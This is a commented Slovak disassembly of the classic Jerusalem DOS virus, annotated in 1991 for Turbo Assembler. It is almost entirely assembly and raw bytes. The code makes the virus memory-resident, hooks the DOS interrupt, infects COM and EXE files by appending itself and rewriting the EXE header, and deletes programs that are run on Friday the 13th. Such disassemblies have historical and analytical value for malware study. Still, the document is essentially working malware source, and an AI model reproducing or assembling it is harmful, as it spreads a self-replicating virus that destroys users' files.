;  Komentovany vypis virusu JERUZALEM
;  Komentar: Vetor      ( 20.6. 1991 )
;  urcene pre Turbo Assembler v2.0

first segment
assume cs:first
org 100h
start:
first ends
  
cseg segment
assume  cs:cseg,ds:cseg
org     0h
  
jeruzalem  proc  far
  
        jmp     loc_2               ; Skok na zaciatok virusu
    db      'sUMsDos'
w000A   dw      100h
w000C   dw  0CD7h
b000E   db  00
w000F   dw      0000h 
w0011   dw  0034h
pv08    dw  0FEA5h, 0f000h
pv21    dw      1460h, 226h
pv24    dw      556h, 0B6Fh 
eff_cou dw  7A22h
    db      8 dup (0)
w0029   dw  0000h
w002B   label   word
    db  00
w002C   label   word
    db  00
w002D   dw      0FA00h
w002F   dw      8F06h
w0031   dw  0C52h
w0033   dw  0080h
    db      0, 0, 80h, 0
w0039   dw  0C52h
    db  5Ch, 0
w003D   dw  0C52h
    db  6Ch, 0 
w0041   dw      0C52h
SP_old  dw  00E6h           ; Povodny SP register (len pre *.EXE)
SS_old  dw  26F1h           ; Povodny SS register (len pre *.EXE)
IP_old  dw      0           ; Zalohovany povodny vstupny bod
CS_old  dw  0C62h           ;   pre *.EXE program
zal_ff  db      0, 0F0h, 6      ; Povodny obsah oblasti 0000:03FCh
is_exe  db  0

;-----------------------------------------------
; Bufer pre nahratie hlavicky exe suboru 

exehdr  db  'MZ'            ; Identifikacia *.exe suboru
partpag dw  00F0h           ; Pocet pouzitych bajtov poslednej stranky
pagecnt dw      00DCh           ; Dlzka suboru v strankach
relcnt  dw  0108h           ; Pocet relokacnych poloziek
hdrsize dw  0060h           ; Dlzka hlavicky v paragrafoch
minmem  dw  0000h           ; Min. pozadovana pamat za koncom prg.
maxmem  dw      0FFFFh          ; Max. pozadovana pamat za koncom prg.
reloSS  dw  1A9Eh           ; Relativny SS v case spustenia
reloSP  dw  710h            ; Hodnota SP v case spustenia
chksum  dw  1984h           ; Kontrolny sucet
reloIP  dw  00C5h           ; Hodnota IP v case spustenia
reloCS  dw  1A9Eh           ; Relativny CS v case spustenia
tabloff dw  0022h           ; Offset zaciatku relokacnej tabulky 
overlay dw  0000h           ; Cislo prekrytia (modulu)
;-----------------------------------------------
    db      30h, 30h, 35h, 0Dh, 0Ah
handle  dw      0005            ; Popisovac aktualne suboru
atrib   dw  0020h           ; Zalohovany atribut suboru
date    dw  0021h           ; Zalohovany datum suboru
time    dw      0012h           ; Zalohovany cas suboru
c0200   dw  0200h
c0010   dw  0010h
lengt   dw      0AFE0h, 0001h       ; Dlzka suboru
fname   dw  41B9h, 9B2Ah        ; Smernik na meno spustaneho suboru
    db      'COMMAND.COM'
w008F   dw      0001
    db  0, 0, 0, 0

loc_2:  cld              
    mov     ah,0E0h             ; Si uz zavedeny v pamati ?
    int     21h                 
    cmp     ah,0E0h
    jae     loc_3               ; Nie => chod sa zaviest
    cmp     ah,3                ; Ano => zisti verziu
    jb      loc_3          
    mov     ah,0DDh
    mov     di,100h
    mov     si,710h
    add     si,di
    db  2Eh, 8Bh, 8Dh, 11h, 0       ; Tieto bajty generuju nasledujucu instr.
       ;mov     cx,cs:[di+0011h]
    int     21h          
loc_3:  mov     ax,cs
    add     ax,10h
    mov     ss,ax
    mov     sp,700h
    push    ax
    mov     ax,0C5h
    push    ax
    ret              
    cld
    push    es
    mov     cs:[w0031],es    
    mov     cs:[w0039],es    
    mov     cs:[w003D],es
    mov     cs:[w0041],es    
    mov     ax,es
    add ax,0010h
    add cs:[CS_old],ax  
    add cs:[SS_old],ax  
    mov ah,0E0h
    int 21h
    cmp ah,0E0h
    jnc lll_1
    cmp ah,03
    pop es
    mov     ss,cs:[SS_old]
    mov sp,cs:[SP_old]
    jmp     dword ptr cs:[IP_old]
lll_1:  xor ax,ax
    mov es,ax
    mov ax,es:[03FCh]
    mov word ptr cs:[zal_ff],ax     
    mov al,es:[03FEh]
    mov cs:[zal_ff+2],al    
    mov     es:[03FCh],0A5F3h
    mov     byte ptr es:[03FEh],0CBh
    pop     ax
    add     ax,10h
    mov     es,ax
    push    cs
    pop     ds
    mov     cx,710h
    shr     cx,1            
    xor     si,si          
    mov     di,si
    push    es
    mov     ax,offset lll_2
    push    ax
    jmp     far ptr x_low
lll_2:  mov     ax,cs
    mov ss,ax
    mov sp,700h
    xor ax,ax
    mov     ds,ax
    mov     ax,word ptr cs:[zal_ff]
    mov ds:[03FCh],ax
    mov al,cs:[zal_ff+2]
    mov ds:[03FEh],al   
    mov     bx,sp
    mov     cl,4
    shr     bx,cl          
    add     bx,10h
    mov     cs:[w0033],bx
    mov     ah,4Ah        
    mov     es,cs:[w0031]    
    int     21h     ;  change mem allocation, bx=siz
    mov     ax,3521h
    int     21h          
    mov     cs:[pv21+0],bx
    mov     cs:[pv21+2],es
    push    cs
    pop     ds
    mov     dx,25Bh
    mov     ax,2521h
    int     21h      
    mov     es,ds:[w0031]  
    mov     es,es:[w002C]  
    xor     di,di    
    mov     cx,7FFFh
    xor     al,al    
locloop_4:
    repnz   scasb        
    cmp     es:[di],al
    loopnz  locloop_4             
    mov     dx,di
    add     dx,3
    mov     ax,4B00h
    push    es
    pop     ds
    push    cs
    pop     es
    mov     bx,35h
    push    ds
    push    es
    push    ax
    push    bx
    push    cx
    push    dx
    mov     ah,2Ah  
    int     21h     ;  get date, cx=year, dx=mon/day
    mov     cs:[b000E],0
    cmp     cx,7C3h
    je      loc_6          
    cmp     al,5
    jne     loc_5          
    cmp     dl,0Dh
    jne     loc_5          
    inc     cs:[b000E]
    jmp     short loc_6
    nop 
loc_5:  mov     ax,3508h
    int     21h        
    mov     cs:[pv08],bx
    mov     cs:[pv08+2],es
    push    cs
    pop     ds
    mov     ds:[eff_cou],7E90h  
    mov     ax,2508h
    mov     dx,21Eh
    int     21h 
loc_6:  pop     dx
    pop     cx
    pop     bx
    pop     ax
    pop     es
    pop     ds
    pushf       
    call    dword ptr cs:[pv21]
    push    ds
    pop     es
    mov     ah,49h  
    int     21h     ;  release memory block, es=seg
    mov     ah,4Dh  
    int     21h ;  get return code info in ax
    mov     ah,31h  
    mov     dx,600h
    mov     cl,4
    shr     dx,cl   
    add     dx,10h
    int     21h ;  terminate & stay resident
    db      32h, 0C0h, 0CFh, 2Eh, 83h, 3Eh
    db      1Fh, 0, 2, 75h, 17h, 50h
    db      53h, 51h, 52h, 55h, 0B8h, 2
    db      6, 0B7h, 87h, 0B9h, 5, 5
    db      0BAh, 10h, 10h, 0CDh, 10h, 5Dh
    db      5Ah, 59h, 5Bh, 58h, 2Eh, 0FFh
    db      0Eh, 1Fh, 0, 75h, 12h, 2Eh
    db      0C7h, 6, 1Fh, 0, 1, 0
    db      50h, 51h, 56h, 0B9h, 1, 40h
    db      0F3h, 0ACh, 5Eh, 59h, 58h, 2Eh
    db      0FFh, 2Eh, 13h, 0, 9Ch, 80h
    db      0FCh, 0E0h, 75h, 5, 0B8h, 0
    db      3, 9Dh, 0CFh, 80h, 0FCh, 0DDh
    db      74h, 13h, 80h, 0FCh, 0DEh, 74h
    db      28h, 3Dh, 0, 4Bh, 75h, 3
    db      0E9h, 0B4h, 0
loc_7:  popf                
    jmp     dword ptr cs:[pv21]
loc_8:  pop     ax
    pop     ax
    mov     ax,100h
    mov     cs:[w000A],ax
    pop     ax
    mov     cs:[w000C],ax
    rep     movsb   
    popf        
    mov     ax,cs:[w000F]
    jmp     dword ptr cs:[w000A]
loc_9:  add     sp,6
    popf        
    mov     ax,cs
    mov     ss,ax
    mov     sp,710h
    push    es
    push    es
    xor     di,di   
    push    cs
    pop     es
    mov     cx,10h
    mov     si,bx
    mov     di,21h
    rep     movsb   
    mov     ax,ds
    mov     es,ax
    mul     cs:[c0010]
    add     ax,cs:[w002B]
    adc     dx,0
    div     cs:[c0010]
    mov     ds,ax
    mov     si,dx
    mov     di,dx
    mov     bp,es
    mov     bx,cs:[w002F]
    or      bx,bx   
    jz      loc_11  
loc_10: mov     cx,8000h
    rep     movsw   
    add     ax,1000h
    add     bp,1000h
    mov     ds,ax
    mov     es,bp
    dec     bx
    jnz     loc_10  
loc_11: mov     cx,cs:[w002D]
    rep     movsb   
    pop     ax
    push    ax
    add     ax,10h
    add     cs:[w0029],ax
data_50 db      2Eh
    db      1, 6, 25h, 0, 2Eh, 0A1h
    db      21h, 0, 1Fh, 7, 2Eh, 8Eh
    db      16h, 29h, 0, 2Eh, 8Bh, 26h
    db      27h, 0, 2Eh, 0FFh, 2Eh, 23h
    db      0
loc_12: xor     cx,cx   
    mov     ax,4301h
    int     21h ;  get/set file attrb, nam@ds:dx
    mov     ah,41h  
    int     21h ;  delete file, name @ ds:dx
    mov     ax,4B00h
    popf        
    jmp     dword ptr cs:[pv21]
loc_13: cmp     cs:[b000E],1
    je      loc_12        
    mov     cs:[handle],0FFFFh
    mov     cs:[w008F],0
    mov     cs:[fname+0],dx
    mov     cs:[fname+2],ds
    push    ax
    push    bx
    push    cx
    push    dx
    push    si
    push    di
    push    ds
    push    es
    cld            
    mov     di,dx
    xor     dl,dl          
    cmp     byte ptr [di+1],3Ah
    jne     loc_14  
    mov     dl,[di]
    and     dl,1Fh
loc_14: mov     ah,36h  
    int     21h     ;  get free space, drive dl,1=a:
    cmp     ax,0FFFFh
    jne     loc_16
loc_15: jmp     loc_42
loc_16: mul     bx  
    mul     cx  
    or      dx,dx   
    jnz     loc_17  
    cmp     ax,710h
    jb      loc_15  
loc_17: mov     dx,cs:[fname]
    push    ds
    pop     es
    xor     al,al       
    mov     cx,41h
    repnz   scasb        
    mov     si,cs:[fname]
loc_18: mov     al,[si]
    or      al,al        
    jz      loc_20       
    cmp     al,61h        ; 'a'
    jb      loc_19       
    cmp     al,7Ah        ; 'z'
    ja      loc_19       
    sub     byte ptr [si],20h
loc_19: inc     si
    jmp     short loc_18
loc_20: mov     cx,0Bh
    sub     si,cx
    mov     di,84h
    push    cs
    pop     es
    mov     cx,0Bh
    rep cmpsb       
    jnz     loc_21      
    jmp     loc_42
loc_21: mov     ax,4300h
    int     21h     ;  get/set file attrb, nam@ds:dx
    jc      loc_22      
    mov     cs:[atrib],cx
loc_22: jc      loc_24      
    xor     al,al       
    mov     cs:[is_exe],al
    push    ds
    pop     es
    mov     di,dx
    mov     cx,41h
    repnz   scasb       
    cmp     byte ptr [di-2],4Dh      ; 'M'
    je      loc_23  
    cmp     byte ptr [di-2],6Dh      ; 'm'
    je      loc_23  
    inc     cs:[is_exe]
loc_23: mov     ax,3D00h
    int     21h     ;  open file, al=mode,name@ds:dx
loc_24: jc      loc_26  
    mov     cs:[handle],ax
    mov     bx,ax
    mov     ax,4202h
    mov     cx,0FFFFh
    mov     dx,0FFFBh
    int     21h     ;  move file ptr, cx,dx=offset
    jc      loc_24  
    add     ax,5
    mov     cs:[w0011],ax
    mov     cx,5
    mov     dx,6Bh
    mov     ax,cs
    mov     ds,ax
    mov     es,ax
    mov     ah,3Fh  
    int     21h     ;  read file, cx=bytes, to ds:dx
    mov     di,dx
    mov     si,5
    rep     cmpsb        
    jnz     loc_25  
    mov     ah,3Eh  
    int     21h     ;  close file, bx=file handle
    jmp     loc_42
loc_25: mov     ax,3524h
    int     21h 
    mov     ds:[pv24+0],bx
    mov     ds:[pv24+2],es
    mov     dx,21Bh
    mov     ax,2524h
    int     21h             
    lds     dx,dword ptr ds:[fname]
    xor     cx,cx   
    mov     ax,4301h
    int     21h   ;get/set file attrb, nam@ds:dx
loc_26: jc      loc_27        
    mov     bx,cs:[handle]
    mov     ah,3Eh        
    int     21h       ;  close file, bx=file handle
    mov     cs:[handle],0FFFFh
    mov     ax,3D02h
    int     21h       ;  open file, al=mode,name@ds:dx
    jc      loc_27  
    mov     cs:[handle],ax
    mov     ax,cs
    mov     ds,ax
    mov     es,ax
    mov     bx,ds:[handle]
    mov     ax,5700h
    int     21h     ;  get/set file date & time
    mov     ds:[date],dx
    mov     ds:[time],cx
    mov     ax,4200h
    xor     cx,cx   
    mov     dx,cx
    int     21h     ;  move file ptr, cx,dx=offset
loc_27: jc      loc_30  
    cmp     ds:[is_exe],0
    je      loc_28  
    jmp     short loc_32
    db      90h
loc_28: mov     bx,1000h
    mov     ah,48h  
    int     21h     ;  allocate memory, bx=bytes/16
    jnc     loc_29  
    mov     ah,3Eh  
    mov     bx,ds:[handle]
    int     21h     ;  close file, bx=file handle
    jmp     loc_42
loc_29: inc     ds:[w008F]
    mov     es,ax
    xor     si,si         
    mov     di,si
    mov     cx,710h
    rep     movsb         
    mov     dx,di
    mov     cx,ds:[w0011]
    mov     bx,ds:[handle]
    push    es
    pop     ds
    mov     ah,3Fh        
    int     21h       ;  read file, cx=bytes, to ds:dx
loc_30: jc      loc_31        
    add     di,cx
    xor     cx,cx          
    mov     dx,cx
    mov     ax,4200h
    int     21h          ;  move file ptr, cx,dx=offset
    mov     si,5
    mov     cx,5
    db      0F3h, 2Eh, 0A4h, 8Bh, 0CFh, 33h
    db      0D2h, 0B4h, 40h, 0CDh
    db      21h
loc_31: jc      loc_33
    jmp     loc_40
loc_32: mov     cx,1Ch
    mov     dx,4Fh
    mov     ah,3Fh  
    int     21h         ;  read file, cx=bytes, to ds:dx
loc_33: jc      loc_35      
    mov     ds:[chksum],1984h
    mov     ax,ds:[reloSS]
    mov     ds:[SS_old],ax
    mov     ax,ds:[reloSP]
    mov     ds:[SP_old],ax
    mov     ax,ds:[reloIP]
    mov     ds:[IP_old],ax
    mov     ax,ds:[reloCS]
    mov     ds:[CS_old],ax
    mov     ax,ds:[pagecnt]
    cmp     ds:[partpag],0
    je      loc_34  
    dec     ax
loc_34: mul     ds:[c0200]    
    add     ax,ds:[partpag]
    adc     dx,0
    add     ax,0Fh
    adc     dx,0
    and     ax,0FFF0h
    mov     ds:[lengt+0],ax
    mov     ds:[lengt+2],dx
    add     ax,710h
    adc     dx,0
loc_35: jc      loc_37  
    div     ds:[c0200]
    or      dx,dx   
    jz      loc_36        
    inc     ax
loc_36: mov     ds:[pagecnt],ax
    mov     ds:[partpag],dx
    mov     ax,ds:[lengt+0]
    mov     dx,ds:[lengt+2]
    div     ds:[c0010]
    sub     ax,ds:[hdrsize]
    mov     ds:[reloCS],ax
    mov     ds:[reloIP],0C5h
    mov     ds:[reloSS],ax
    mov     ds:[reloSP],710h
    xor     cx,cx         
    mov     dx,cx
    mov     ax,4200h
    int     21h       ;  move file ptr, cx,dx=offset
loc_37: jc      loc_38        
    mov     cx,1Ch
    mov     dx,4Fh
    mov     ah,40h        
    int     21h         ;  write file cx=bytes, to ds:dx
loc_38: jc      loc_39        
    cmp     ax,cx
    jne     loc_40        
    mov     dx,ds:[lengt+0]
    mov     cx,ds:[lengt+2]
    mov     ax,4200h
    int     21h       ;  move file ptr, cx,dx=offset
loc_39: jc      loc_40        
    xor     dx,dx         
    mov     cx,710h
    mov     ah,40h        
    int     21h        ;  write file cx=bytes, to ds:dx
loc_40: cmp     cs:[w008F],0
    je      loc_41  
    mov     ah,49h  
    int     21h     ;  release memory block, es=seg
loc_41: cmp     cs:[handle],0FFFFh
    je      loc_42  
    mov     bx,cs:[handle]
    mov     dx,cs:[date]
    mov     cx,cs:[time]
    mov     ax,5701h
    int     21h     ;  get/set file date & time
    mov     ah,3Eh  
    int     21h     ;  close file, bx=file handle
    lds     dx,dword ptr cs:[fname]
    mov     cx,cs:[atrib]
    mov     ax,4301h
    int     21h     ;  get/set file attrb, nam@ds:dx
    lds     dx,dword ptr cs:[pv24]
    mov     ax,2524h
    int     21h     ;  set intrpt vector al to ds:dx
loc_42: pop     es
    pop     ds
    pop     di
    pop     si
    pop     dx
    pop     cx
    pop     bx
    pop     ax
    popf        
    jmp     dword ptr cs:[pv21]

    db      11 dup (0)
    db      4Dh, 6Fh, 0Bh, 0, 10h, 0
    db      10 dup (0)
    db      0E9h, 92h, 0, 73h, 55h, 4Dh
    db      73h, 44h, 6Fh, 73h, 0, 1
    db      0D7h, 0Ch, 0, 0, 0, 34h
    db      0, 0A5h, 0FEh, 0, 0F0h, 60h
    db      14h, 26h, 2, 56h, 5, 6Fh
    db      0Bh, 22h, 7Ah, 0
    db      12 dup (0)
    db      0FAh, 6, 8Fh, 52h, 0Ch, 80h
    db      0, 0, 0, 80h, 0, 52h
    db      0Ch, 5Ch, 0, 52h, 0Ch, 6Ch
    db      0, 52h, 0Ch, 0E6h, 0, 0F1h
    db      26h, 0, 0, 62h, 0Ch, 0
    db      0F0h, 6, 0, 4Dh, 5Ah, 0F0h
    db      0, 0DCh, 0, 8, 1, 60h
    db      0, 0, 0, 0FFh, 0FFh, 9Eh
    db      1Ah, 10h, 7, 84h, 19h, 0C5h
    db      0, 9Eh, 1Ah, 22h, 0, 0
    db      0, 30h, 30h, 35h, 0Dh, 0Ah
    db      5, 0, 20h, 0, 21h, 0
    db      12h, 0, 0, 2, 10h, 0
    db      0E0h, 0AFh, 1, 0, 0B9h, 41h
    db      2Ah, 9Bh
    db      'COMMAND.COM'
    db      1, 0, 0, 0, 0, 0
    db      0FCh, 0B4h, 0E0h, 0CDh, 21h, 80h
    db      0FCh, 0E0h, 73h, 16h, 80h, 0FCh
    db      3, 72h, 11h, 0B4h, 0DDh, 0BFh
    db      0, 1, 0BEh, 10h, 7, 3
    db      0F7h, 2Eh, 8Bh, 8Dh, 11h, 0
    db      0CDh
    db      21h
loc_43: mov     ax,cs
    add     ax,10h
    mov     ss,ax
    mov     sp,700h
    push    ax
    mov     ax,0C5h
    push    ax
    ret              ; Return far
  
    db      0FCh, 6, 2Eh, 8Ch, 6, 31h
    db      0, 2Eh, 8Ch, 6, 39h, 0
    db      2Eh, 8Ch, 6, 3Dh, 0, 2Eh
    db      8Ch, 6, 41h, 0, 8Ch, 0C0h
    db      5, 10h, 0, 2Eh, 1, 6
    db      49h, 0, 2Eh, 1, 6, 45h
    db      0, 0B4h, 0E0h, 0CDh, 21h, 80h
    db      0FCh, 0E0h, 73h, 13h, 80h, 0FCh
    db      3, 7, 2Eh, 8Eh, 16h, 45h
    db      0, 2Eh, 8Bh, 26h, 43h, 0CDh
    db      ' 000000010'
    db      8 dup (30h)
    db      32h, 30h
    db      8 dup (30h)
    db      33h, 30h
    db      8 dup (30h)
    db      34h, 30h
    db      8 dup (30h)
    db      '5', 0Dh, 0Ah, 'MsDos'  
jeruzalem endp  
cseg ends


ram_low segment at 0000
assume cs:ram_low
org 3FCh

x_low proc far
    rep movsw
    ret
x_low endp

ram_low ends

end start
